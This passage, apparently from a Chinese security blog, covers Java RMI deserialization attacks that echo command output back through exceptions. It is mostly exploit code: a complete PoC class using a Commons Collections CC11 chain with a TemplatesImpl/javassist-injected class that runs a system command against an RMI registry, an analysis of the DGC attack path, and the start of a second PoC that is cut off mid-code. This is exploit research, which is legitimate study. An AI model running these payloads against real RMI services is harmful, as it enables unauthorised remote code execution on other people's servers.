class="hljs-number">812</span>, TCPTransport<span class="hljs-number">$ConnectionHandler</span> (sun.rmi.transport.tcp)<br><span class="hljs-symbol">run:</span><span class="hljs-number">671</span>, TCPTransport<span class="hljs-number">$ConnectionHandler</span> (sun.rmi.transport.tcp)<br><span class="hljs-symbol">runWorker:</span><span class="hljs-number">1142</span>, ThreadPoolExecutor (java.util.concurrent)<br><span class="hljs-symbol">run:</span><span class="hljs-number">617</span>, ThreadPoolExecutor<span class="hljs-number">$Worker</span> (java.util.concurrent)<br><span class="hljs-symbol">run:</span><span class="hljs-number">745</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>通过构造恶意的反序列化链，将命令执行的结果放在异常中并抛出，这里使用 CC11</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRMI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;dddd&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Process proc = Runtime.getRuntime().exec(\&quot;hostname\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));&quot;</span> +<br>                <span class="hljs-string">&quot;        StringBuffer sb = new StringBuffer();&quot;</span> +<br>                <span class="hljs-string">&quot;        String line;&quot;</span> +<br>                <span class="hljs-string">&quot;        while ((line = br.readLine()) != null)&quot;</span> +<br>                <span class="hljs-string">&quot;        &#123;&quot;</span> +<br>                <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;        String result = \&quot;result: \&quot; + sb.toString();&quot;</span> +<br>                <span class="hljs-string">&quot;throw new java.lang.InstantiationException(result);&quot;</span>;<br>        <br>        cc.makeClassInitializer().insertAfter(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rce&quot;</span> + System.nanoTime();<br>        cc.setName(randomName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[] classBytes = cc.toBytecode();<br>        classBytes[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>        classBytes[<span class="hljs-number">7</span>] = <span class="hljs-number">50</span>;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">impl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(impl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;);<br>        setFieldValue(impl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;testTemplatesImpl&quot;</span>);<br>        setFieldValue(impl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;asdfasdfasdf&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(innermap, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(map, impl);<br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashset</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashset.add(<span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashset_map</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            hashset_map = (HashMap) getFieldObject(HashSet.class, <span class="hljs-string">&quot;map&quot;</span>, hashset).get(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            hashset_map = (HashMap) getFieldObject(HashSet.class, <span class="hljs-string">&quot;backingMap&quot;</span>, hashset).get(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        Object[] array = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            array = (Object[]) getFieldObject(HashMap.class, <span class="hljs-string">&quot;table&quot;</span>, hashset_map).get(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            array = (Object[]) getFieldObject(HashMap.class, <span class="hljs-string">&quot;elementData&quot;</span>, hashset_map).get(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) &#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">keyField</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        &#125;<br>        keyField.setAccessible(<span class="hljs-literal">true</span>);<br>        keyField.set(node, tiedmap);<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> createMap(<span class="hljs-string">&quot;asdffq&quot;</span>, hashset);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map1);<br><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(<br>                Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler));<br>        <span class="hljs-keyword">try</span> &#123;<br>            registry.bind(<span class="hljs-string">&quot;cmd&quot;</span>, remote);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">pw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(sw);<br><br>            <span class="hljs-comment">// 将错误信息输出到 PrintWriter 对象中</span><br>            e.printStackTrace(pw);<br><br>            <span class="hljs-comment">// 将错误堆栈信息转换为字符串</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">stackTrace</span> <span class="hljs-operator">=</span> sw.toString();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">indexString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Caused by: java.lang.InstantiationException: result: &quot;</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> stackTrace.indexOf(indexString);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> stackTrace.lastIndexOf(<span class="hljs-string">&quot;at&quot;</span>);<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">exceptionDetails</span> <span class="hljs-operator">=</span> stackTrace.substring(index + indexString.length(), end);<br><br>            System.out.println(exceptionDetails);<br>        &#125;<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldname, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldname);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List <span class="hljs-title function_">getFieldObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object object)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        list.add(field.get(object));<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title function_">createMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String key, <span class="hljs-keyword">final</span> Object val)</span> &#123;<br>        <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map.put(key, val);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="DGC-攻击回显"><a href="#DGC-攻击回显" class="headerlink" title="DGC 攻击回显"></a>DGC 攻击回显</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>这个攻击的触发点在<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>方法中，如果无法将断点下在该类，可以在<code>sun.rmi.transport.DGCImpl#dirty</code>方法中下断点</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1694334967650-669888c7-2d12-4898-b22b-bf4ce861a583.png" alt="image.png"></p><p><code>DGCImpl_Skel#dispatch</code>方法也是在<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>方法中被调用的，通过之前的分析可知，依然可以通过报错回显将结果返回</p><p><img src="https://blog-img-by-me.oss-cn-beijing.aliyuncs.com/img/1694335413341-eb8509d6-ccee-4e23-9685-4fb1365d2ee2.png" alt="image.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">dirty:</span><span class="hljs-number">120</span>, DGCImpl (sun.rmi.transport)<br><span class="hljs-symbol">dispatch:</span><span class="hljs-number">-1</span>, DGCImpl_Skel (sun.rmi.transport)<br><span class="hljs-symbol">oldDispatch:</span><span class="hljs-number">410</span>, UnicastServerRef (sun.rmi.server)<br><span class="hljs-symbol">dispatch:</span><span class="hljs-number">268</span>, UnicastServerRef (sun.rmi.server)<br><span class="hljs-symbol">run:</span><span class="hljs-number">178</span>, Transport<span class="hljs-number">$1</span> (sun.rmi.transport)<br><span class="hljs-symbol">run:</span><span class="hljs-number">175</span>, Transport<span class="hljs-number">$1</span> (sun.rmi.transport)<br><span class="hljs-symbol">doPrivileged:</span><span class="hljs-number">-1</span>, AccessController (java.security)<br><span class="hljs-symbol">serviceCall:</span><span class="hljs-number">174</span>, Transport (sun.rmi.transport)<br><span class="hljs-symbol">handleMessages:</span><span class="hljs-number">557</span>, TCPTransport (sun.rmi.transport.tcp)<br><span class="hljs-symbol">run0:</span><span class="hljs-number">812</span>, TCPTransport<span class="hljs-number">$ConnectionHandler</span> (sun.rmi.transport.tcp)<br><span class="hljs-symbol">run:</span><span class="hljs-number">671</span>, TCPTransport<span class="hljs-number">$ConnectionHandler</span> (sun.rmi.transport.tcp)<br><span class="hljs-symbol">runWorker:</span><span class="hljs-number">1142</span>, ThreadPoolExecutor (java.util.concurrent)<br><span class="hljs-symbol">run:</span><span class="hljs-number">617</span>, ThreadPoolExecutor<span class="hljs-number">$Worker</span> (java.util.concurrent)<br><span class="hljs-symbol">run:</span><span class="hljs-number">745</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> sun.rmi.server.MarshalOutputStream;<br><span class="hljs-keyword">import</span> sun.rmi.transport.TransportConstants;<br><br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> java.io.DataOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRMI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;dddd&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Process proc = Runtime.getRuntime().exec(\&quot;hostname\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));&quot;</span> +<br>                <span class="hljs-string">&quot;        StringBuffer sb = new StringBuffer();&quot;</span> +<br>                <span class="hljs-string">&quot;        String line;&quot;</span> +<br>                <span class="hljs-string">&quot;        while ((line = br.readLine()) != null)&quot;</span> +<br>                <span class="hljs-string">&quot;        &#123;&quot;</span> +<br>                <span class="hljs-string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;        String result = \&quot;cmdResult: \&quot; + sb.toString() + \&quot;cmdEnd\&quot;;&quot;</span> +<br>                <span class="hljs-string">&quot;throw new java.lang.InstantiationException(result);&quot;</span>;<br><br>        cc.makeClassInitializer().insertAfter(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rce&quot;</span> + System.nanoTime();<br>        cc.setName(randomName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[] classBytes = cc.toBytecode();<br>        classBytes[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>        classBytes[<span class="hljs-number">7</span>] = <span class="hljs-number">50</span>;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">impl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(impl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;);<br>        setFieldValue(impl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;testTemplatesImpl&quot;</span>);<br>        setFieldValue(impl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;asdfasdfasdf&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innermap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(innermap, transformer);<br>        <span 